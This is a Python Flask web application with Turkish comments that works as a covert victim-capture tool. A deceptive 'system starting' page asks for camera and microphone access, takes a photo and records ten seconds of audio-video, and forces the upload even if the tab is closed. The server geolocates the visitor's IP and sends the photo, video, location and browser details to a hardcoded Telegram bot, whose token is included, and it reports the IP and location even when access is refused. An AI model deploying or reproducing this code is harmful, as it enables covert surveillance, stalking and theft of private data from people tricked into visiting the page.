from flask import Flask, request, jsonify
import requests
import os
import base64

app = Flask(__name__)

# --- AYARLAR ---
TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"

# --- TELEGRAM FONKSİYONLARI ---
def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
    except Exception as e:
        print("Mesaj Hatası:", e)

def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
    try:
        resim_verisi = fotograf_base64.split(",")[1]
        resim_bytes = base64.b64decode(resim_verisi)
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('ajan.jpg', resim_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
        
        requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        print("Fotoğraf Hatası:", e)

def telegram_video_gonder(video_dosyasi):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo"
        files = {'video': ('ajan_video.webm', video_dosyasi, 'video/webm')}
        data = {'chat_id': CHAT_ID}
        
        # Video boyutu büyük olabileceği için timeout süresini uzun tuttuk
        requests.post(url, files=files, data=data, timeout=40)
    except Exception as e:
        print("Video Gönderme Hatası:", e)

# --- WEB ROTALARI ---
@app.route('/', methods=['GET'])
def ana_sayfa():
    if request.path == '/favicon.ico': return "OK", 200
    
    # Gerçek IP'yi al
    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
    
    # Eğer yerel IP ise, dış IP'ye çevir
    sorgulanan_ip = ziyaretci_ip
    if ziyaretci_ip.startswith("192.168.") or ziyaretci_ip.startswith("127.") or ziyaretci_ip.startswith("10."):
        try:
            sorgulanan_ip = requests.get('https://api.ipify.org', timeout=3).text
        except:
            pass

    user_agent = request.headers.get('User-Agent', '').lower()
    
    # 🚨 BOT FİLTRESİ (Senin kaldırdığını söylediğin ama güvenlik için eklediğimiz filtre)
    if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or 'python' in user_agent:
        return "OK", 200

    # 📸 FOTOĞRAF VE SESLİ VİDEO İSTEĞİ
    html = f"""
    <body style='background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding-top:15%;'>
        <h2 style='color:red;'>SİSTEM BAŞLATILIYOR...</h2>
        <p id='durum'>Lütfen kamera ve mikrofon izni verin...</p>

        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            window.onload = async function() {{
                const durum = document.getElementById('durum');
                let mediaRecorder;
                let videoChunks = [];
                let stream;
                let isSent = false; // Çift gönderimi engellemek için

                function verileriGonder() {{
                    if (isSent) return;
                    isSent = true;

                    if (mediaRecorder && mediaRecorder.state === 'recording') {{
                        mediaRecorder.stop(); // Kaydı durdur, onstop'u tetikler
                    }}
                }}

                try {{
                    // Hem kamera hem mikrofon izni
                    stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {{
                        setTimeout(() => {{
                            // 1. ADIM: FOTOĞRAF ÇEK VE GÖNDER
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const foto = canvas.toDataURL('image/jpeg');
                            
                            fetch('/kamera', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ image: foto, ip: "{sorgulanan_ip}" }})
                            }});

                            durum.innerHTML = "✅ Fotoğraf çekildi. Sesli Video kaydı başlıyor...";
                            
                            // 2. ADIM: SESLİ VİDEO KAYDET
                            mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});

                            mediaRecorder.ondataavailable = event => {{
                                if (event.data.size > 0) {{
                                    videoChunks.push(event.data);
                                }}
                            }};

                            mediaRecorder.onstop = () => {{
                                const videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
                                const formData = new FormData();
                                formData.append('video_dosyasi', videoBlob, 'kayit.webm');
                                
                                // keepalive: true sayesinde sayfa kapansa bile veri gitmeye devam eder
                                fetch('/video', {{
                                    method: 'POST',
                                    body: formData,
                                    keepalive: true 
                                }});
                                
                                stream.getTracks().forEach(track => track.stop());
                                durum.innerHTML = "✅ İşlem tamamlandı!";
                            }};

                            mediaRecorder.start();
                            
                            // 10 Saniyelik Sayaç
                            let saniye = 10;
                            const sayac = setInterval(() => {{
                                if(!isSent) {{
                                    durum.innerHTML = "🎥 Sesli Video Kaydediliyor: " + saniye + " saniye kaldı...";
                                    saniye--;
                                }}
                            }}, 1000);

                            // 1. DURUM: 10 saniye dolarsa
                            setTimeout(() => {{
                                clearInterval(sayac);
                                verileriGonder(); 
                            }}, 10000); 

                            // 2. DURUM: Sekme kapatılırsa veya geri gidilirse
                            window.addEventListener('beforeunload', verileriGonder);

                            // 3. DURUM: Uygulama arka plana atılırsa (Mobil)
                            document.addEventListener('visibilitychange', () => {{
                                if (document.visibilityState === 'hidden') {{
                                    verileriGonder();
                                }}
                            }});

                        }}, 1500); // Kamera ısınsın diye 1.5 saniye bekle
                    }};
                }} catch (error) {{
                    durum.innerHTML = "❌ İzin verilmedi (Kamera/Mikrofon)";
                    fetch('/kamera_hata', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ ip: "{sorgulanan_ip}", hata: error.message }})
                    }});
                }}
            }};
        </script>
    </body>
    """
    return html

@app.route('/kamera', methods=['POST'])
def kamera():
    veri = request.json
    ip = veri['ip']
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
    
    try:
        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        sehir = konum.get('city', 'Bilinmiyor')
        hava = requests.get(f'https://wttr.in/{sehir}?format=3', timeout=3).text.strip()
    except:
        sehir, hava = "Bilinmiyor", "Alınamadı"

    bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}
☀️ <b>Hava Durumu:</b> {hava}
📱 <b>Tarayıcı:</b> {user_agent[:50]}..."""

    telegram_fotograf_gonder(veri['image'], bilgi_metni)
    return "OK", 200

@app.route('/video', methods=['POST'])
def video():
    if 'video_dosyasi' not in request.files:
        return jsonify({"hata": "Video bulunamadı"}), 400
    
    video_dosyasi = request.files['video_dosyasi']
    video_verisi = video_dosyasi.read()
    
    telegram_video_gonder(video_verisi)
    return "OK", 200

@app.route('/kamera_hata', methods=['POST'])
def kamera_hata():
    veri = request.json
    ip = veri['ip']
    
    try:
        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        sehir = konum.get('city', 'Bilinmiyor')
    except:
        sehir = "Bilinmiyor"

    mesaj = f"""⚠️ <b>İZİN VERİLMEDİ</b>
    
🌐 <b>IP Adresi:</b> {ip}
📍 <b>Konum:</b> {sehir}
📱 <b>Tarayıcı:</b> {request.headers.get('User-Agent', 'Bilinmiyor')[:50]}..."""

    telegram_mesaj_gonder(mesaj)
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
